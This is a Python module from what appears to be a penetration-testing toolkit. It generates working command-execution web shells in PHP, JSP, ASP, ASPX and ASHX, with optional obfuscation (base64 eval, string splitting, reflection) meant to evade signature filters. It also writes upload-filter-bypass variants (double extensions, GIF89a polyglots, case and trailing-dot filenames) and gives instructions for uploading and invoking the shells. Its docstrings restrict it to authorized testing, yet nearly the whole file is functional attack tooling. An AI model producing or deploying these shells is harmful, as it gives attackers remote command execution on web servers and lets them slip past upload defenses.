"""Web shell + upload-filter-bypass generator.

Purely offline, deterministic *generation* of minimal command-exec web shells
(PHP / JSP / JSPX / ASP / ASPX, plus a language-agnostic "generic" pseudocode
template) and, optionally, a set of classic upload-filter-bypass filename and
content variants (alternate extensions, double extensions, a GIF89a
magic-byte polyglot prefix, plus notes on trailing-dot/trailing-space and
case-trick filenames).

This module NEVER executes anything it produces and NEVER makes a network
call -- it only writes files under the engagement workdir via
``ctx.artifact_path``. It is intended strictly for AUTHORIZED upload-filter
and web-shell testing (bug bounty / pentest / CTF with permission).

No AI, no third-party dependencies -- Python standard library only.
"""
from __future__ import annotations

import base64
import re
import uuid
from typing import Dict, List

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

# --------------------------------------------------------------------------- #
# constants
# --------------------------------------------------------------------------- #
LANGS = ["php", "jsp", "jspx", "asp", "aspx", "generic"]

# Primary extension written for each language.
EXT_MAP: Dict[str, str] = {
    "php": "php",
    "jsp": "jsp",
    "jspx": "jspx",
    "asp": "asp",
    "aspx": "aspx",
    "generic": "generic.txt",
}

# Alternate extensions that some misconfigured upload filters/handlers treat
# the same as the "real" extension (only meaningful for kind=upload).
#
# "asa"/"cer"/"cdx" are safe to relabel verbatim for classic ASP: IIS maps
# them to the same ASP script engine, so the identical VBScript source runs
# unchanged under any of those extensions. "ashx" is NOT safe to relabel for
# ASPX -- see the note on _ALT_EXT_IS_LANG / _build_ashx below. "asmx" (a
# SOAP web service, not GET/POST-parameter driven by default) needs a very
# different shape of shell to actually work, so it is intentionally omitted
# rather than shipping a variant that looks plausible but will not execute.
ALT_EXT_MAP: Dict[str, List[str]] = {
    "php": ["phtml", "php5", "phar", "pht"],
    "jsp": ["jspx"],
    "jspx": [],
    "asp": ["asa", "cer", "cdx"],
    "aspx": ["ashx"],
    "generic": [],
}

# When an alt-extension is itself a properly supported "language" with its
# own required file shape, rebuild the shell using a dedicated builder so the
# artifact is well-formed for its target extension, rather than just
# relabeling the original file's bytes:
#   - "jspx" is XML-wrapped JSP (needs the <jsp:root> envelope).
#   - "ashx" is an ASP.NET *generic handler*: the default ASP.NET Framework
#     build-provider mapping compiles .ashx via WebHandlerBuildProvider,
#     which requires a `<%@ WebHandler %>` directive and an IHttpHandler
#     class -- NOT the `<%@ Page %>` + <script runat="server"> shape used by
#     .aspx. Reusing the raw .aspx bytes under a renamed .ashx extension
#     would fail to parse on a real target, so it gets its own builder.
_ALT_EXT_IS_LANG = {"jspx", "ashx"}

# Extensions treated as "safe" images for double-extension tricks, e.g.
# shell.php.jpg (server only inspects the last / first extension token).
DOUBLE_EXT_SUFFIXES = ["jpg", "png", "gif"]

_AUTH_NOTE = "redkit web.webshell - AUTHORIZED TESTING ONLY"


# --------------------------------------------------------------------------- #
# small helpers
# --------------------------------------------------------------------------- #
def _sanitize_ident(raw: str, default: str = "cmd") -> str:
    """Restrict a user-supplied identifier (param name) to [A-Za-z0-9_].

    Doing this means the identifier can be embedded directly into any target
    language's string literal without further escaping (it can never contain
    a quote/backslash/etc.).
    """
    cleaned = re.sub(r"[^A-Za-z0-9_]", "", str(raw or ""))
    return cleaned or default


def _esc_dquote(s: str) -> str:
    """Escape a string for embedding inside a double-quoted literal in
    PHP / Java / C# (backslash then quote).

    PHP double-quoted strings may contain a raw newline, but Java and C#
    regular string literals may NOT -- an operator-supplied password with an
    embedded ``\\n``/``\\r`` would otherwise produce a generated .jsp/.jspx
    or .aspx file that fails to compile. Escaping them to the ``\\n``/``\\r``
    escape sequences keeps the literal valid (and unchanged, functionally) in
    all three languages.
    """
    s = str(s).replace("\\", "\\\\").replace('"', '\\"')
    return s.replace("\r", "\\r").replace("\n", "\\n")


def _esc_vbs(s: str) -> str:
    """Escape a string for a classic-ASP/VBScript double-quoted literal
    (VBScript only needs quote-doubling; it has no backslash escapes).

    VBScript also has no way to embed a raw newline inside a string literal
    (and classic-ASP source is line-oriented), so strip any CR/LF from the
    input rather than risk a syntactically broken .asp file.
    """
    return str(s).replace('"', '""').replace("\r", "").replace("\n", "")


def _rand_suffix() -> str:
    """Short random token used to vary generated identifier names so two
    generations of the same (lightly) obfuscated shell don't share a
    byte-for-byte signature. Not a security control -- purely cosmetic."""
    return uuid.uuid4().hex[:6]


def _vbs_chr_encode(s: str) -> str:
    """Render a literal string as a VBScript ``Chr(n)&Chr(n)&...`` expression.

    Used to keep the literal token (e.g. ``WScript.Shell``) out of the raw
    source text for naive signature-based filters.
    """
    parts = [f"Chr({ord(ch)})" for ch in s]
    return "&".join(parts) if parts else '""'


# --------------------------------------------------------------------------- #
# per-language shell builders
#   Each returns the FULL file content (including delimiters). The password
#   gate is omitted entirely when ``password`` is empty. Obfuscation is a
#   light, cosmetic transform (variable renaming / string-splitting /
#   reflection indirection) meant to dodge naive extension/signature filters
#   during AUTHORIZED testing -- it is not intended to defeat real AV/EDR.
# --------------------------------------------------------------------------- #
def _build_php(param: str, password: str, obfuscate: bool) -> str:
    lines = [f"// {_AUTH_NOTE}"]
    if password:
        lines.append(
            f'if (!isset($_REQUEST["pw"]) || $_REQUEST["pw"] !== "{_esc_dquote(password)}") '
            "{ http_response_code(404); exit; }"
        )
    if obfuscate:
        fn_var = "f_" + _rand_suffix()
        lines.append(f'${fn_var} = "sys" . "tem";')
        lines.append(f'if (isset($_REQUEST["{param}"])) {{ ${fn_var}($_REQUEST["{param}"]); }}')
    else:
        lines.append(f'if (isset($_REQUEST["{param}"])) {{ system($_REQUEST["{param}"]); }}')
    body = "\n".join(lines)

    if obfuscate:
        blob = base64.b64encode(body.encode("utf-8")).decode("ascii")
        return f'<?php eval(base64_decode("{blob}")); ?>\n'
    return f"<?php\n{body}\n?>\n"


def _jsp_body(param: str, password: str, obfuscate: bool) -> str:
    lines = [f"// {_AUTH_NOTE}"]
    if password:
        lines.append('String pw = request.getParameter("pw");')
        lines.append(f'if (pw == null || !pw.equals("{_esc_dquote(password)}")) {{ response.sendError(404); return; }}')
    lines.append(f'String cmd = request.getParameter("{param}");')
    lines.append("if (cmd != null) {")
    if obfuscate:
        s = "_" + _rand_suffix()
        lines.append(f'    Class rc{s} = Class.forName("java.lang.Run" + "time");')
        lines.append(f'    java.lang.reflect.Method gr{s} = rc{s}.getMethod("get" + "Runtime");')
        lines.append(f'    java.lang.reflect.Method ex{s} = rc{s}.getMethod("ex" + "ec", String.class);')
        lines.append(f'    Object rt{s} = gr{s}.invoke(null);')
        lines.append(f'    Process proc{s} = (Process) ex{s}.invoke(rt{s}, cmd);')
        proc_var = f"proc{s}"
    else:
        lines.append("    Process proc = Runtime.getRuntime().exec(cmd);")
        proc_var = "proc"
    lines.append(f"    java.io.InputStream is = {proc_var}.getInputStream();")
    lines.append("    byte[] buf = new byte[4096];")
    lines.append("    int n;")
    lines.append('    while ((n = is.read(buf)) != -1) { out.print(new String(buf, 0, n)); }')
    lines.append("}")
    return "\n".join(lines)


def _build_jsp(param: str, password: str, obfuscate: bool) -> str:
    body = _jsp_body(param, password, obfuscate)
    imports = "java.io.*,java.lang.reflect.*" if obfuscate else "java.io.*"
    return f'<%@ page import="{imports}" %>\n<%\n{body}\n%>\n'


def _build_jspx(param: str, password: str, obfuscate: bool) -> str:
    body = _jsp_body(param, password, obfuscate)
    imports = "java.io.*,java.lang.reflect.*" if obfuscate else "java.io.*"
    return (
        '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">\n'
        f'  <jsp:directive.page contentType="text/html" import="{imports}"/>\n'
        "  <jsp:scriptlet><![CDATA[\n"
        f"{body}\n"
        "  ]]></jsp:scriptlet>\n"
        "</jsp:root>\n"
    )


def _build_asp(param: str, password: str, obfuscate: bool) -> str:
    lines = [f"' {_AUTH_NOTE}"]
    if password:
        lines.append("Dim pw")
        lines.append(f'pw = Request.QueryString("pw")')
        lines.append(f'If pw <> "{_esc_vbs(password)}" Then')
        lines.append('  Response.Status = "404 Not Found"')
        lines.append("  Response.End")
        lines.append("End If")
    lines.append("Dim cmd")
    lines.append(f'cmd = Request.QueryString("{param}")')
    lines.append('If cmd <> "" Then')
    lines.append("  Dim oShell, oExec")
    if obfuscate:
        s = "_" + _rand_suffix()
        lines.append(f"  Dim ws{s}")
        lines.append(f"  ws{s} = {_vbs_chr_encode('WScript.Shell')}")
        lines.append(f"  Set oShell = CreateObject(ws{s})")
        lines.append('  Set oExec = oShell.Exec("c" & "md.exe /c " & cmd)')
    else:
        lines.append('  Set oShell = CreateObject("WScript.Shell")')
        lines.append('  Set oExec = oShell.Exec("cmd.exe /c " & cmd)')
    lines.append("  Response.Write oExec.StdOut.ReadAll()")
    lines.append("End If")
    body = "\n".join(lines)
    return f"<%\n{body}\n%>\n"


def _build_aspx(param: str, password: str, obfuscate: bool) -> str:
    s = "_" + _rand_suffix() if obfuscate else ""
    lines = [f"    // {_AUTH_NOTE}"]
    if password:
        lines.append(f'    string pw{s} = Request.QueryString["pw"];')
        lines.append(f'    if (pw{s} != "{_esc_dquote(password)}") {{ Response.StatusCode = 404; Response.End(); return; }}')
    lines.append(f'    string cmd{s} = Request.QueryString["{param}"];')
    lines.append(f"    if (!string.IsNullOrEmpty(cmd{s})) {{")
    if obfuscate:
        lines.append(f'        string exe{s} = "c" + "md" + ".exe";')
        lines.append(f'        ProcessStartInfo psi{s} = new ProcessStartInfo(exe{s}, "/" + "c " + cmd{s});')
    else:
        lines.append(f'        ProcessStartInfo psi{s} = new ProcessStartInfo("cmd.exe", "/c " + cmd{s});')
    lines.append(f"        psi{s}.RedirectStandardOutput = true;")
    lines.append(f"        psi{s}.UseShellExecute = false;")
    lines.append(f"        Process p{s} = Process.Start(psi{s});")
    lines.append(f"        Response.Write(p{s}.StandardOutput.ReadToEnd());")
    lines.append("    }")
    body = "\n".join(lines)
    return (
        '<%@ Page Language="C#" %>\n'
        '<%@ Import Namespace="System.Diagnostics" %>\n'
        "<script runat=\"server\">\n"
        "void Page_Load(object sender, EventArgs e) {\n"
        f"{body}\n"
        "}\n"
        "</script>\n"
    )


def _build_ashx(param: str, password: str, obfuscate: bool) -> str:
    """ASP.NET *generic handler* (.ashx) command-exec shell.

    Distinct from :func:`_build_aspx`: .ashx is compiled by ASP.NET's
    WebHandlerBuildProvider, which requires a ``<%@ WebHandler %>``
    directive plus an ``IHttpHandler`` implementation -- not the
    ``<%@ Page %>``/``<script runat="server">`` shape used by .aspx pages.
    """
    s = "_" + _rand_suffix() if obfuscate else ""
    lines = [f"        // {_AUTH_NOTE}"]
    if password:
        lines.append(f'        string pw{s} = context.Request.QueryString["pw"];')
        lines.append(
            f'        if (pw{s} != "{_esc_dquote(password)}") '
            "{ context.Response.StatusCode = 404; return; }"
        )
    lines.append(f'        string cmd{s} = context.Request.QueryString["{param}"];')
    lines.append(f"        if (!string.IsNullOrEmpty(cmd{s})) {{")
    if obfuscate:
        lines.append(f'            string exe{s} = "c" + "md" + ".exe";')
        lines.append(f'            ProcessStartInfo psi{s} = new ProcessStartInfo(exe{s}, "/" + "c " + cmd{s});')
    else:
        lines.append(f'            ProcessStartInfo psi{s} = new ProcessStartInfo("cmd.exe", "/c " + cmd{s});')
    lines.append(f"            psi{s}.RedirectStandardOutput = true;")
    lines.append(f"            psi{s}.UseShellExecute = false;")
    lines.append(f"            Process p{s} = Process.Start(psi{s});")
    lines.append(f"            context.Response.Write(p{s}.StandardOutput.ReadToEnd());")
    lines.append("        }")
    body = "\n".join(lines)
    return (
        '<%@ WebHandler Language="C#" Class="RedkitHandler" %>\n'
        "using System;\n"
        "using System.Web;\n"
        "using System.Diagnostics;\n\n"
        "public class RedkitHandler : IHttpHandler {\n"
        "    public bool IsReusable { get { return false; } }\n"
        "    public void ProcessRequest(HttpContext context) {\n"
        f"{body}\n"
        "    }\n"
        "}\n"
    )


def _build_generic(param: str, password: str, obfuscate: bool) -> str:
    pw_line = (
        f'    if password_configured and request.pw != "{password}": return 404\n'
        if password
        else "    (no password gate configured)\n"
    )
    return (
        "# redkit web.webshell - generic / unlisted-language template\n"
        f"# {_AUTH_NOTE}\n"
        "# This file is DOCUMENTATION, not runnable code -- adapt the pattern below\n"
        "# to the target's actual server-side language/runtime.\n"
        "#\n"
        "# Command-exec pattern:\n"
        f'#   1. Read the command from request parameter "{param}" (GET or POST).\n'
        '#   2. If a password is configured, first check request parameter "pw"\n'
        "#      and reject (HTTP 404) on mismatch.\n"
        "#   3. Execute the command with the platform's process-exec primitive and\n"
        "#      write stdout/stderr back into the response body.\n"
        "#\n"
        "# Password gate pseudocode:\n"
        f"{pw_line}"
        "#\n"
        "# Equivalent snippets for common runtimes:\n"
        f"#   Perl (CGI):        system($cgi->param('{param}'));\n"
        f"#   Python (WSGI/CGI): subprocess.run(shlex.split(cmd), capture_output=True)\n"
        f"#   Bash (CGI):        eval \"$cmd\"\n"
        f"#   Node.js:           child_process.execSync(cmd)\n"
        f'#   Go:                exec.Command("sh", "-c", cmd).CombinedOutput()\n'
    )


_BUILDERS = {
    "php": _build_php,
    "jsp": _build_jsp,
    "jspx": _build_jspx,
    "asp": _build_asp,
    "aspx": _build_aspx,
    "ashx": _build_ashx,
    "generic": _build_generic,
}


def _build_shell(lang: str, param: str, password: str, obfuscate: bool) -> str:
    builder = _BUILDERS.get(lang, _build_generic)
    return builder(param, password, obfuscate)


def _usage_hints(lang: str, ext: str, param: str, password: bool) -> List[str]:
    pw_qs = "&pw=<password>" if password else ""
    if lang == "generic":
        return [
            f"'generic' is a documentation template (shell.{ext}) - adapt the pattern to",
            f"the target's actual server-side language. Command param: {param}"
            + ("; password param: pw" if password else ""),
        ]
    return [
        f"Upload shell.{ext} to the target, then invoke it directly, e.g.:",
        f"  GET  /path/to/shell.{ext}?{param}=id{pw_qs}",
        f"  (send as POST form data instead if the app only reads the POST body)",
    ]


def _write(ctx, name: str, content: str) -> str:
    """Write text content to ctx.workdir via ctx.artifact_path. Returns the
    path as a string, or "" on failure (never raises -- generation must not
    crash the run)."""
    try:
        path = ctx.artifact_path(name)
        path.write_text(content, encoding="utf-8")
        return str(path)
    except OSError as exc:
        ctx.console.warn(f"could not write {name}: {exc}")
        return ""


# --------------------------------------------------------------------------- #
# module
# --------------------------------------------------------------------------- #
@register
class WebShell(Module):
    """Generate a minimal web shell and/or upload-filter-bypass variants.

    Purely offline generation: nothing is executed and no network request is
    ever made. Every artifact is written under the engagement workdir for the
    operator to manually deploy against an AUTHORIZED target.
    """

    name = "web.webshell"
    description = "Web shell + upload-filter-bypass generator (offline, never executed)"
    phase = "web"
    options = [
        Option("lang", default="php", choices=LANGS, help="target server-side language"),
        Option("password", default="", help='if set, gate the shell behind this password (?pw=...)'),
        Option("param", default="cmd", help="request parameter name carrying the command"),
        Option("obfuscate", default=False, help="lightly obfuscate generated code to dodge naive signature filters"),
        Option(
            "kind",
            default="cmd",
            choices=["cmd", "upload"],
            help="cmd = command-exec shell only; upload = also emit upload-filter-bypass filename/content variants",
        ),
    ]
    references = [
        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
        "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files",
        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Shells",
    ]

    def run(self, opts: Dict[str, object], ctx) -> Result:
        lang = str(opts["lang"])
        password = str(opts["password"] or "")
        param = _sanitize_ident(str(opts["param"] or "cmd"))
        obfuscate = bool(opts["obfuscate"])
        kind = str(opts["kind"])
        ext = EXT_MAP[lang]

        console = ctx.console
        console.banner(
            "WEB SHELL GENERATOR",
            f"lang={lang} kind={kind} param={param} obfuscate={obfuscate} "
            f"password={'set' if password else 'none'}",
        )

        code = _build_shell(lang, param, password, obfuscate)

        files: Dict[str, str] = {}
        artifacts: List[str] = []

        primary_name = f"shell.{ext}"
        primary_path = _write(ctx, primary_name, code)
        if primary_path:
            files[primary_name] = primary_path
            artifacts.append(primary_path)
            console.good(f"wrote {primary_name} ({len(code)} bytes)")

        for line in _usage_hints(lang, ext, param, bool(password)):
            console.info(line)

        bypass_data: Dict[str, object] = {}
        if kind == "upload":
            bypass_data = self._emit_upload_bypass(
                ctx, lang, ext, code, param, password, obfuscate, files, artifacts
            )

        try:
            ctx.engagement.add_note(
                f"web.webshell: generated {lang} {kind} shell "
                f"(param={param}, password={'set' if password else 'none'}, obfuscate={obfuscate}) "
                f"-> {len(files)} file(s)"
            )
        except Exception:  # engagement persistence must never break generation
            pass

        summary = (
            f"Generated {lang} {kind} web shell: {len(files)} artifact(s) in {ctx.workdir}"
        )
        data: Dict[str, object] = {
            "lang": lang,
            "kind": kind,
            "param": param,
            "password_protected": bool(password),
            "obfuscate": obfuscate,
            "ext": ext,
            "files": files,
        }
        if bypass_data:
            data["bypass"] = bypass_data

        return Result(ok=bool(files), summary=summary, data=data, artifacts=artifacts)

    # ------------------------------------------------------------------ #
    # upload-filter-bypass artifact generation
    # ------------------------------------------------------------------ #
    def _emit_upload_bypass(
        self,
        ctx,
        lang: str,
        ext: str,
        code: str,
        param: str,
        password: str,
        obfuscate: bool,
        files: Dict[str, str],
        artifacts: List[str],
    ) -> Dict[str, object]:
        console = ctx.console
        alt_written: List[str] = []
        double_written: List[str] = []

        # -- alternate extensions ------------------------------------------
        for alt in ALT_EXT_MAP.get(lang, []):
            if alt in _ALT_EXT_IS_LANG and alt in _BUILDERS:
                alt_content = _build_shell(alt, param, password, obfuscate)
            else:
                alt_content = code
            name = f"shell.{alt}"
            path = _write(ctx, name, alt_content)
            if path:
                files[name] = path
                artifacts.append(path)
                alt_written.append(name)
        if alt_written:
            console.good(f"alternate-extension variants: {', '.join(alt_written)}")

        # -- double extensions (e.g. shell.php.jpg) ------------------------
        for img_ext in DOUBLE_EXT_SUFFIXES:
            name = f"shell.{ext}.{img_ext}"
            path = _write(ctx, name, code)
            if path:
                files[name] = path
                artifacts.append(path)
                double_written.append(name)
        if double_written:
            console.good(f"double-extension variants: {', '.join(double_written)}")

        # -- GIF89a magic-byte polyglot prefix ------------------------------
        polyglot_name = f"shell_polyglot.{ext}"
        polyglot_content = "GIF89a\n" + code
        polyglot_path = _write(ctx, polyglot_name, polyglot_content)
        if polyglot_path:
            files[polyglot_name] = polyglot_path
            artifacts.append(polyglot_path)
            console.good(f"GIF89a polyglot variant: {polyglot_name}")

        # -- filename-only tricks (not written as real files -- see notes) --
        trailing_variants = [f"shell.{ext}.", f"shell.{ext} "]
        case_variants = [f"shell.{ext}".upper(), _mixed_case(f"shell.{ext}")]

        content_type_notes = [
            "Content-Type header check only: try image/gif, image/jpeg, image/png, "
            "or application/octet-stream on the multipart part.",
            f"Magic-byte / content-sniffing check: use {polyglot_name} (starts with the "
            "GIF89a signature) while keeping an executable extension.",
            "Extension check inspects only the LAST token: try the alternate-extension "
            f"variants ({', '.join(alt_written) or 'n/a'}).",
            "Extension check inspects only the FIRST token (naive `.endswith`/split "
            f"logic): try the double-extension variants ({', '.join(double_written) or 'n/a'}).",
            "Trailing-dot/space and case-trick filenames below are NOT written as literal "
            "files (Windows normalizes trailing dots/spaces and NTFS is case-insensitive, "
            "which would silently collide with the primary file). Type them manually into "
            "the multipart 'filename=' field with curl -F/Burp Repeater instead.",
        ]

        manifest_lines = [
            f"# redkit web.webshell upload-bypass manifest",
            f"# lang={lang} param={param} password={'set' if password else 'none'} obfuscate={obfuscate}",
            f"# {_AUTH_NOTE}",
            "",
            "## Files written to disk (use directly as the upload's file content)",
        ]
        for name in [f"shell.{ext}", *alt_written, *double_written, polyglot_name]:
            if name in files:
                manifest_lines.append(f"  {name}")
        manifest_lines += [
            "",
            "## Filename-only variants (type manually into the upload filename field)",
            "### trailing dot / trailing space",
        ]
        manifest_lines += [f"  {repr(v)}" for v in trailing_variants]
        manifest_lines += ["", "### case tricks"]
        manifest_lines += [f"  {v}" for v in case_variants]
        manifest_lines += ["", "## Content-Type / bypass notes"]
        manifest_lines += [f"  - {n}" for n in content_type_notes]

        manifest_name = "upload_bypass_manifest.txt"
        manifest_path = _write(ctx, manifest_name, "\n".join(manifest_lines) + "\n")
        if manifest_path:
            files[manifest_name] = manifest_path
            artifacts.append(manifest_path)
            console.info(f"wrote {manifest_name}")

        return {
            "alt_extensions": alt_written,
            "double_extensions": double_written,
            "polyglot": polyglot_name if polyglot_path else None,
            "trailing_variants": trailing_variants,
            "case_variants": case_variants,
            "content_type_notes": content_type_notes,
        }


def _mixed_case(s: str) -> str:
    """Alternate upper/lower case per character, e.g. 'shell.php' -> 'ShElL.PhP'."""
    out = []
    upper = True
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            out.append(ch)
    return "".join(out)
